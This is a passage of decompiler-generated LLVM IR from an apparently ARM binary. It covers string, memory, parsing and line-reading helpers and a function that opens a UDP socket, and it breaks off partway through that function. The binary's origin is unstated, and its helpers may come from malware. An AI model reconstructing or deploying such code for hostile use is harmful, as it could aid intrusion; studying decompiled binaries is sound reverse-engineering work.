  uselistorder i32 %v1_11f90, { 1, 0 }
  uselistorder i32 %v1_11f6c, { 1, 0 }
  uselistorder i32 %v1_11ea8, { 1, 0 }
  uselistorder i32 %v1_11e80, { 1, 0 }
  uselistorder i32 %v1_11e0c, { 1, 0 }
  uselistorder i32 %v1_11d6c, { 1, 0 }
  uselistorder i32 %v1_11cf8, { 1, 0 }
  uselistorder i32 %v1_11cc8, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 3, { 2, 1, 0 }
  uselistorder i8 6, { 5, 6, 7, 8, 4, 9, 0, 10, 11, 1, 2, 3 }
  uselistorder i8 4, { 4, 3, 2, 0, 1 }
  uselistorder i8 11, { 2, 3, 4, 0, 1 }
  uselistorder i8 5, { 12, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 11, 13, 9 }
  uselistorder i32 (i32, i32, i32)* @function_12558, { 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 9, 8, 7, 6, 5, 12, 11, 10, 3, 2, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1e898.323 to i32), { 5, 0, 1, 2, 3, 4 }
}

define i32 @function_124dc(i8* %arg1) local_unnamed_addr {
dec_label_pc_124dc:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v3_124e0 = load i8, i8* %arg1, align 1
  %v4_124e0 = zext i8 %v3_124e0 to i32
  %v2_124e4 = icmp eq i8 %v3_124e0, 0
  br i1 %v2_124e4, label %dec_label_pc_12500, label %bb

dec_label_pc_12500:                               ; preds = %dec_label_pc_124f0, %dec_label_pc_124dc
  %merge = phi i32 [ %v4_124e0, %dec_label_pc_124dc ], [ %v1_124f0, %dec_label_pc_124f0 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_124dc
  br label %dec_label_pc_124f0

dec_label_pc_124f0:                               ; preds = %dec_label_pc_124f0, %bb
  %v0_124f0 = phi i32 [ %v1_124f0, %dec_label_pc_124f0 ], [ 0, %bb ]
  %v1_124f0 = add i32 %v0_124f0, 1
  %v2_124f4 = add i32 %v1_124f0, %tmp
  %v3_124f4 = inttoptr i32 %v2_124f4 to i8*
  %v4_124f4 = load i8, i8* %v3_124f4, align 1
  %v2_124f8 = icmp eq i8 %v4_124f4, 0
  br i1 %v2_124f8, label %dec_label_pc_12500, label %dec_label_pc_124f0

; uselistorder directives
  uselistorder i32 %v1_124f0, { 1, 0, 2 }
}

define i32 @function_12504(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12504:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12504 = load i8, i8* %arg1, align 1
  %v3_12504 = zext i8 %v2_12504 to i32
  %v2_12508 = icmp eq i8 %v2_12504, 0
  br i1 %v2_12508, label %dec_label_pc_1254c, label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %dec_label_pc_12504
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12514

dec_label_pc_12514:                               ; preds = %dec_label_pc_12514, %dec_label_pc_12510
  %v0_12514 = phi i32 [ %v1_12514, %dec_label_pc_12514 ], [ 0, %dec_label_pc_12510 ]
  %v1_12514 = add i32 %v0_12514, 1
  store i32 %v1_12514, i32* %ip.global-to-local, align 4
  %v2_12518 = add i32 %v1_12514, %tmp
  %v3_12518 = inttoptr i32 %v2_12518 to i8*
  %v4_12518 = load i8, i8* %v3_12518, align 1
  %v2_1251c = icmp eq i8 %v4_12518, 0
  br i1 %v2_1251c, label %dec_label_pc_12524, label %dec_label_pc_12514

dec_label_pc_12524:                               ; preds = %dec_label_pc_12514
  %v7_12524 = icmp eq i32 %v0_12514, -2
  br i1 %v7_12524, label %dec_label_pc_12544, label %dec_label_pc_12530.preheader

dec_label_pc_12530.preheader:                     ; preds = %dec_label_pc_12524, %dec_label_pc_1254c
  %storemerge = phi i32 [ %v3_12504, %dec_label_pc_1254c ], [ %v1_12514, %dec_label_pc_12524 ]
  %v2_1253c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %dec_label_pc_12530.dec_label_pc_12530_crit_edge, %dec_label_pc_12530.preheader
  %v2_1253c = phi i32 [ %v5_1253c, %dec_label_pc_12530.dec_label_pc_12530_crit_edge ], [ %v2_1253c.pre, %dec_label_pc_12530.preheader ]
  %v0_12534 = phi i32 [ %v0_12534.pre, %dec_label_pc_12530.dec_label_pc_12530_crit_edge ], [ %tmp, %dec_label_pc_12530.preheader ]
  %v0_12530 = phi i32 [ %v0_12530.pre, %dec_label_pc_12530.dec_label_pc_12530_crit_edge ], [ %storemerge, %dec_label_pc_12530.preheader ]
  %v1_12530 = add i32 %v0_12530, -1
  store i32 %v1_12530, i32* @r2, align 4
  %v1_12534 = inttoptr i32 %v0_12534 to i8*
  %v2_12534 = load i8, i8* %v1_12534, align 1
  %v5_12534 = add i32 %v0_12534, 1
  store i32 %v5_12534, i32* %r1.global-to-local, align 4
  %v3_12538 = icmp eq i32 %v0_12530, 0
  %v3_1253c = inttoptr i32 %v2_1253c to i8*
  store i8 %v2_12534, i8* %v3_1253c, align 1
  %v4_1253c = load i32, i32* @r0, align 4
  %v5_1253c = add i32 %v4_1253c, 1
  store i32 %v5_1253c, i32* @r0, align 4
  br i1 %v3_12538, label %dec_label_pc_12544.loopexit, label %dec_label_pc_12530.dec_label_pc_12530_crit_edge

dec_label_pc_12530.dec_label_pc_12530_crit_edge:  ; preds = %dec_label_pc_12530
  %v0_12530.pre = load i32, i32* @r2, align 4
  %v0_12534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12530

dec_label_pc_12544.loopexit:                      ; preds = %dec_label_pc_12530
  %v0_12544.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_12544.loopexit, %dec_label_pc_12524
  %v0_12544 = phi i32 [ %v0_12544.pre, %dec_label_pc_12544.loopexit ], [ %v1_12514, %dec_label_pc_12524 ]
  ret i32 %v0_12544

dec_label_pc_1254c:                               ; preds = %dec_label_pc_12504
  store i32 %v3_12504, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12530.preheader

; uselistorder directives
  uselistorder i32 %v5_1253c, { 1, 0 }
  uselistorder i32 %v0_12534, { 1, 0 }
  uselistorder i32 %v1_12514, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_12504, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12530.preheader, { 1, 0 }
}

define i32 @function_12558(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12558:
  %ip.global-to-local = alloca i32, align 4
  %v2_12558 = icmp eq i32 %arg3, 0
  br i1 %v2_12558, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12564, %dec_label_pc_12558
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12558
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12564

dec_label_pc_12564:                               ; preds = %dec_label_pc_12564, %bb
  %v0_12564 = phi i32 [ %v1_1256c, %dec_label_pc_12564 ], [ 0, %bb ]
  %v2_12564 = add i32 %v0_12564, %arg2
  %v3_12564 = inttoptr i32 %v2_12564 to i8*
  %v4_12564 = load i8, i8* %v3_12564, align 1
  %v4_12568 = add i32 %v0_12564, %arg1
  %v5_12568 = inttoptr i32 %v4_12568 to i8*
  store i8 %v4_12564, i8* %v5_12568, align 1
  %v0_1256c = load i32, i32* %ip.global-to-local, align 4
  %v1_1256c = add i32 %v0_1256c, 1
  store i32 %v1_1256c, i32* %ip.global-to-local, align 4
  %v9_12570 = icmp eq i32 %v1_1256c, %arg3
  br i1 %v9_12570, label %.loopexit, label %dec_label_pc_12564

; uselistorder directives
  uselistorder i32 %v1_1256c, { 1, 2, 0 }
}

define i32 @function_1257c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1257c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_1257c = icmp eq i32 %arg2, 0
  br i1 %v2_1257c, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_1258c, %dec_label_pc_1257c
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_1257c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge, %bb
  %v2_1258c = phi i32 [ %v1_12590, %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge ], [ 0, %bb ]
  %v0_1258c.off0 = phi i8 [ %extract.t, %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge ], [ 0, %bb ]
  %v4_1258c = add i32 %v2_1258c, %arg1
  %v5_1258c = inttoptr i32 %v4_1258c to i8*
  store i8 %v0_1258c.off0, i8* %v5_1258c, align 1
  %v0_12590 = load i32, i32* %r3.global-to-local, align 4
  %v1_12590 = add i32 %v0_12590, 1
  store i32 %v1_12590, i32* %r3.global-to-local, align 4
  %v9_12594 = icmp eq i32 %v1_12590, %arg2
  br i1 %v9_12594, label %.loopexit, label %dec_label_pc_1258c.dec_label_pc_1258c_crit_edge

dec_label_pc_1258c.dec_label_pc_1258c_crit_edge:  ; preds = %dec_label_pc_1258c
  %v0_1258c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_1258c.pre to i8
  br label %dec_label_pc_1258c

; uselistorder directives
  uselistorder i32 %v1_12590, { 1, 2, 0 }
}

define i32 @function_125a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_125a0:
  store i32 %arg4, i32* @lr, align 4
  %v7_125b4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_125b4, label %dec_label_pc_125b8, label %dec_label_pc_125c0

dec_label_pc_125b8:                               ; preds = %dec_label_pc_125d4, %dec_label_pc_125a0, %dec_label_pc_125c0
  ret i32 -1

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125a0
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_125b8, label %dec_label_pc_125c8

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125c0
  br label %dec_label_pc_125e0

dec_label_pc_125d4:                               ; preds = %dec_label_pc_125f8, %dec_label_pc_125e0
  %v1_125d4 = add i32 %v0_12600, 1
  %v9_125d8 = icmp eq i32 %v1_125d4, %arg2
  br i1 %v9_125d8, label %dec_label_pc_125b8, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d4, %dec_label_pc_125c8
  %v0_12600 = phi i32 [ %v1_125d4, %dec_label_pc_125d4 ], [ 0, %dec_label_pc_125c8 ]
  %v0_125ec = phi i32 [ %v1_125ec., %dec_label_pc_125d4 ], [ 0, %dec_label_pc_125c8 ]
  %v2_125e0 = add i32 %v0_125ec, %arg3
  %v3_125e0 = inttoptr i32 %v2_125e0 to i8*
  %v4_125e0 = load i8, i8* %v3_125e0, align 1
  %v2_125e4 = add i32 %v0_12600, %arg1
  %v3_125e4 = inttoptr i32 %v2_125e4 to i8*
  %v4_125e4 = load i8, i8* %v3_125e4, align 1
  %v9_125e8 = icmp eq i8 %v4_125e4, %v4_125e0
  %v1_125ec = add i32 %v0_125ec, 1
  %v1_125ec. = select i1 %v9_125e8, i32 %v1_125ec, i32 0
  br i1 %v9_125e8, label %dec_label_pc_125f8, label %dec_label_pc_125d4

dec_label_pc_125f8:                               ; preds = %dec_label_pc_125e0
  %v9_125f8 = icmp eq i32 %v1_125ec., %arg4
  br i1 %v9_125f8, label %dec_label_pc_12600, label %dec_label_pc_125d4

dec_label_pc_12600:                               ; preds = %dec_label_pc_125f8
  %v1_12600 = add i32 %v0_12600, 1
  ret i32 %v1_12600

; uselistorder directives
  uselistorder i1 %v9_125e8, { 1, 0 }
  uselistorder i32 %v0_125ec, { 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_125b8, { 0, 2, 1 }
}

define i32 @function_12608(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12608:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_12608 = load i32, i32* @r4, align 4
  store i32 %v3_12608, i32* %stack_var_-28, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12614

dec_label_pc_12614:                               ; preds = %.thread, %dec_label_pc_1262c, %bb, %dec_label_pc_12608
  %v0_12614 = phi i32 [ %tmp, %dec_label_pc_12608 ], [ %v5_12614, %bb ], [ %v5_12614, %dec_label_pc_1262c ], [ %v5_12614, %.thread ]
  %v1_12614 = inttoptr i32 %v0_12614 to i8*
  %v2_12614 = load i8, i8* %v1_12614, align 1
  %v3_12614 = zext i8 %v2_12614 to i32
  %v5_12614 = add i32 %v0_12614, 1
  store i32 %v5_12614, i32* %r5.global-to-local, align 4
  %v7_1261c = icmp eq i8 %v2_12614, 9
  br i1 %v7_1261c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12614
  store i32 %v3_12614, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12614

bb:                                               ; preds = %dec_label_pc_12614
  %v8_12620 = icmp eq i8 %v2_12614, 32
  store i32 %v3_12614, i32* %r4.global-to-local, align 4
  br i1 %v8_12620, label %dec_label_pc_12614, label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %bb
  %v7_1262c = icmp eq i8 %v2_12614, 10
  br i1 %v7_1262c, label %dec_label_pc_12614, label %dec_label_pc_12634

dec_label_pc_12634:                               ; preds = %dec_label_pc_1262c
  %v7_12634 = icmp eq i8 %v2_12614, 45
  br i1 %v7_12634, label %dec_label_pc_12714, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12634
  %v7_1263c = icmp eq i8 %v2_12614, 43
  br i1 %v7_1263c, label %bb48, label %dec_label_pc_1264c

bb48:                                             ; preds = %dec_label_pc_1263c
  %v2_12640 = inttoptr i32 %v5_12614 to i8*
  %v3_12640 = load i8, i8* %v2_12640, align 1
  %v4_12640 = zext i8 %v3_12640 to i32
  store i32 %v4_12640, i32* %r4.global-to-local, align 4
  %v6_12640 = add i32 %v0_12614, 2
  store i32 %v6_12640, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %bb48, %dec_label_pc_1263c, %dec_label_pc_12714
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12714 ], [ 2147483647, %dec_label_pc_1263c ], [ 2147483647, %bb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_12714 ], [ 0, %dec_label_pc_1263c ], [ 0, %bb48 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_12654 = call i32 @function_12bf8(i32 %storemerge1, i32 %arg2)
  %v0_12658 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12658, i32* @r1, align 4
  store i32 %v2_12654, i32* %r8.global-to-local, align 4
  store i32 %storemerge1, i32* @r0, align 4
  %v0_12664 = call i32 @function_12ae8()
  store i32 %v0_12664, i32* @lr, align 4
  %v0_12674.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %.thread8, %dec_label_pc_1264c
  %v2_126f011 = phi i32 [ %v1_1270c26, %.thread8 ], [ 0, %dec_label_pc_1264c ]
  %v1_126cc = phi i32 [ %v0_1270024, %.thread8 ], [ 0, %dec_label_pc_1264c ]
  %v1_126b4 = phi i32 [ %v3_126f8, %.thread8 ], [ %v0_12674.pre, %dec_label_pc_1264c ]
  %v1_12674 = urem i32 %v1_126b4, 256
  %v1_12678 = add nsw i32 %v1_12674, -48
  %v1_12680 = add nsw i32 %v1_12674, -97
  %v1_12684 = add i32 %v1_126b4, -48
  %v1_12688 = add nsw i32 %v1_12674, -65
  %tmp71 = icmp ult i32 %v1_12678, 10
  br i1 %tmp71, label %dec_label_pc_126b8, label %dec_label_pc_12690

dec_label_pc_12690:                               ; preds = %dec_label_pc_12674
  %v2_12690 = icmp ugt i32 %v1_12688, 24
  %v7_12690 = icmp eq i32 %v1_12688, 25
  %v2_12694 = xor i1 %v7_12690, true
  %v3_12694 = and i1 %v2_12690, %v2_12694
  br i1 %v3_12694, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_12690
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_12690, %bb49
  %v0_126a820 = phi i32 [ %v1_12684, %dec_label_pc_12690 ], [ 0, %bb49 ]
  %v2_12698 = xor i1 %v2_12690, true
  %v3_12698 = or i1 %v7_12690, %v2_12698
  br i1 %v3_12698, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v0_126a8 = phi i32 [ %v0_126a820, %bb50 ], [ 1, %bb51 ]
  br i1 %v3_12694, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  %v6_126a0 = icmp ugt i32 %v1_12680, 24
  %v11_126a0 = icmp eq i32 %v1_12680, 25
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_126a4 = phi i1 [ %v7_12690, %bb52 ], [ %v11_126a0, %bb53 ]
  %v0_126a4 = phi i1 [ %v2_12690, %bb52 ], [ %v6_126a0, %bb53 ]
  %v2_126a4 = xor i1 %v1_126a4, true
  %v3_126a4 = and i1 %v0_126a4, %v2_126a4
  br i1 %v3_126a4, label %dec_label_pc_12700, label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %bb54
  %v2_126a8 = icmp eq i32 %v0_126a8, 0
  %. = select i1 %v2_126a8, i32 87, i32 55
  %v2_126b4 = sub i32 %v1_126b4, %.
  br label %dec_label_pc_126b8

dec_label_pc_126b8:                               ; preds = %dec_label_pc_12674, %dec_label_pc_126a8
  %v0_126cc34 = phi i32 [ %v1_12688, %dec_label_pc_12674 ], [ %., %dec_label_pc_126a8 ]
  %v3_126f012 = phi i32 [ %v1_12684, %dec_label_pc_12674 ], [ %v2_126b4, %dec_label_pc_126a8 ]
  %v1_126b8 = load i32, i32* %r6.global-to-local, align 4
  %v6_126bc = icmp slt i32 %v3_126f012, %v1_126b8
  br i1 %v6_126bc, label %dec_label_pc_126c0, label %dec_label_pc_12700

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126b8
  %v3_126c0 = icmp uge i32 %v2_126f011, %v0_12664
  %v9_126c0 = icmp eq i32 %v2_126f011, %v0_12664
  %v2_126c4 = xor i1 %v3_126c0, true
  %v3_126c4 = or i1 %v9_126c0, %v2_126c4
  br i1 %v3_126c4, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_126c0
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_126c0, %bb57
  %v0_126cc33 = phi i32 [ %v0_126cc34, %dec_label_pc_126c0 ], [ 0, %bb57 ]
  %v2_126c8 = xor i1 %v9_126c0, true
  %v3_126c8 = and i1 %v3_126c0, %v2_126c8
  br i1 %v3_126c8, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v0_126cc = phi i32 [ %v0_126cc33, %bb58 ], [ 1, %bb59 ]
  %tmp72 = icmp slt i32 %v1_126cc, 0
  %v4_126cc = zext i1 %tmp72 to i32
  %v5_126cc = or i32 %v0_126cc, %v4_126cc
  %v7_126cc = icmp eq i32 %v5_126cc, 0
  br i1 %v7_126cc, label %dec_label_pc_126d8, label %.thread8

dec_label_pc_126d8:                               ; preds = %bb60
  %v1_126e4 = load i32, i32* %r8.global-to-local, align 4
  %v7_126e8 = icmp sgt i32 %v3_126f012, %v1_126e4
  br i1 %v7_126e8, label %bb63, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_126d8
  br label %bb64

bb63:                                             ; preds = %dec_label_pc_126d8
  %v2_126ec = icmp eq i1 %v9_126c0, false
  br i1 %v2_126ec, label %bb64, label %.thread8

bb64:                                             ; preds = %bb63, %.thread5
  %v4_126f013 = mul i32 %v1_126b8, %v2_126f011
  %v5_126f014 = add i32 %v4_126f013, %v3_126f012
  br label %.thread8

.thread8:                                         ; preds = %bb63, %bb60, %bb64
  %v1_1270c26 = phi i32 [ %v2_126f011, %bb63 ], [ %v2_126f011, %bb60 ], [ %v5_126f014, %bb64 ]
  %v0_1270024 = phi i32 [ -1, %bb63 ], [ -1, %bb60 ], [ 1, %bb64 ]
  %v0_126f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_126f8 = inttoptr i32 %v0_126f8 to i8*
  %v2_126f8 = load i8, i8* %v1_126f8, align 1
  %v3_126f8 = zext i8 %v2_126f8 to i32
  store i32 %v3_126f8, i32* %r4.global-to-local, align 4
  %v5_126f8 = add i32 %v0_126f8, 1
  store i32 %v5_126f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12674

dec_label_pc_12700:                               ; preds = %dec_label_pc_126b8, %bb54
  %v1_12700 = icmp slt i32 %v1_126cc, 0
  %v0_12724 = load i32, i32* %sl.global-to-local, align 4
  %v2_12724 = icmp eq i32 %v0_12724, 0
  br i1 %v1_12700, label %dec_label_pc_12724, label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_12700
  br i1 %v2_12724, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_12708
  %v2_1270c = sub i32 0, %v2_126f011
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12708, %bb65
  %v23_12710 = phi i32 [ %v2_126f011, %dec_label_pc_12708 ], [ %v2_1270c, %bb65 ]
  %v2_12710 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12710, i32* @r4, align 4
  ret i32 %v23_12710

dec_label_pc_12714:                               ; preds = %dec_label_pc_12634
  %v1_12714 = inttoptr i32 %v5_12614 to i8*
  %v2_12714 = load i8, i8* %v1_12714, align 1
  %v3_12714 = zext i8 %v2_12714 to i32
  store i32 %v3_12714, i32* %r4.global-to-local, align 4
  %v5_12714 = add i32 %v0_12614, 2
  store i32 %v5_12714, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1264c

dec_label_pc_12724:                               ; preds = %dec_label_pc_12700
  %.70 = select i1 %v2_12724, i32 2147483647, i32 -2147483648
  %v2_12730 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12730, i32* @r4, align 4
  ret i32 %.70

; uselistorder directives
  uselistorder i32 %v3_126f8, { 1, 0 }
  uselistorder i1 %v9_126c0, { 1, 0, 2 }
  uselistorder i1 %v3_126c0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_12690, { 1, 2, 0 }
  uselistorder i1 %v2_12690, { 1, 0, 2 }
  uselistorder i32 %v1_12674, { 1, 2, 0 }
  uselistorder i32 %v1_126b4, { 1, 2, 0 }
  uselistorder i32 %v1_126cc, { 1, 0 }
  uselistorder i32 %v2_126f011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_12664, { 1, 0, 2 }
  uselistorder i32 %v5_12614, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v3_12614, { 1, 0 }
  uselistorder i32 %v0_12614, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i8 9, { 6, 0, 1, 2, 5, 3, 4 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_126b8, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1264c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12614, { 1, 2, 0, 3 }
}

define i32 @function_12734(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12734:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12734 = load i32, i32* @r4, align 4
  store i32 %v3_12734, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1274c

dec_label_pc_1274c:                               ; preds = %dec_label_pc_12778.dec_label_pc_1274c_crit_edge, %dec_label_pc_12734
  %v0_12750 = phi i32 [ %v0_12750.pre, %dec_label_pc_12778.dec_label_pc_1274c_crit_edge ], [ %arg3, %dec_label_pc_12734 ]
  %v0_1274c = phi i32 [ %v1_12764, %dec_label_pc_12778.dec_label_pc_1274c_crit_edge ], [ %tmp, %dec_label_pc_12734 ]
  %tmp12 = inttoptr i32 %v0_1274c to i32*
  %v5_12758 = call i32 @function_13064(i32 %v0_12750, i32* %tmp12, i32 1)
  %v7_1275c = icmp eq i32 %v5_12758, 1
  %v0_12760 = load i32, i32* @r4, align 4
  %v1_12764 = add i32 %v0_12760, 1
  store i32 %v1_12764, i32* @r4, align 4
  %v0_1276c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_1275c, label %dec_label_pc_1276c, label %dec_label_pc_12784

dec_label_pc_1276c:                               ; preds = %dec_label_pc_1274c
  %v1_1276c = add i32 %v0_1276c, 1
  store i32 %v1_1276c, i32* %r5.global-to-local, align 4
  %v0_12770 = load i32, i32* %r7.global-to-local, align 4
  %v7_12774 = icmp sgt i32 %v0_12770, %v1_1276c
  br i1 %v7_12774, label %dec_label_pc_12778, label %dec_label_pc_12784

dec_label_pc_12778:                               ; preds = %dec_label_pc_1276c
  %v1_12778 = inttoptr i32 %v0_12760 to i8*
  %v2_12778 = load i8, i8* %v1_12778, align 1
  %v7_1277c = icmp eq i8 %v2_12778, 10
  br i1 %v7_1277c, label %dec_label_pc_12784, label %dec_label_pc_12778.dec_label_pc_1274c_crit_edge

dec_label_pc_12778.dec_label_pc_1274c_crit_edge:  ; preds = %dec_label_pc_12778
  %v0_12750.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1274c

dec_label_pc_12784:                               ; preds = %dec_label_pc_1274c, %dec_label_pc_12778, %dec_label_pc_1276c
  %v0_12784 = phi i32 [ %v1_1276c, %dec_label_pc_12778 ], [ %v1_1276c, %dec_label_pc_1276c ], [ %v0_1276c, %dec_label_pc_1274c ]
  %v2_12784 = icmp eq i32 %v0_12784, 0
  %v1_12788 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_12784, i32 0, i32 %v1_12788
  %v2_12790 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12790, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12764, { 1, 0 }
  uselistorder i8 10, { 8, 1, 0, 9, 7, 10, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_13064, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12784, { 1, 2, 0 }
}

define i32 @function_12794() local_unnamed_addr {
dec_label_pc_12794:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12794 = load i32, i32* @r4, align 4
  store i32 16, i32* @r4, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_127a4 = call i32 @function_13470()
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_127ac = inttoptr i32 %v0_127a4 to i32*
  store i32 0, i32* %v2_127ac, align 4
  %v0_127b8 = load i32, i32* %r6.global-to-local, align 4
  %v3_127bc = call i32 @function_13790(i32 2, i32 2, i32 %v0_127b8)
  %v7_127c8 = icmp eq i32 %v3_127bc, -1
  store i32 %v3_127bc, i32* %r5.global-to-local, align 4
  %v2_127d4 = load i32, i32* @r4, align 4
  br i1 %v7_127c8, label %dec_label_pc_12824, label %dec_label_pc_127e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_12794
  %v7_127d4 = shl i32 2056, %v2_127d4
  %v8_127d4 = or i32 %v7_127d4, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_12804 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_12804 = call i32 @function_135ec(i32 %v3_127bc, %sockaddr* %v3_12804, i32 %v2_127d4)
